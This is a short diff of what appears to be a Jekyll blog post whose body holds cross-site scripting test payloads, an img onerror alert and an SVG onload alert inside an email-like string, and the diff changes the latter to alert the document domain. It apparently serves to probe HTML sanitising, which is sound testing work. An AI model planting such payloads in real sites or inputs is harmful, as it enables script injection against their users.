@@ -7,4 +7,4 @@ categories: jekyll update
 
 
 <xml:namespace prefix="t"><svg><style>&lt;img/src=x onerror=alert(1)// </b> 
-“><svg/onload=alert(2)>”@x.y
+“><svg/onload=alert(document.domain)>”@x.y
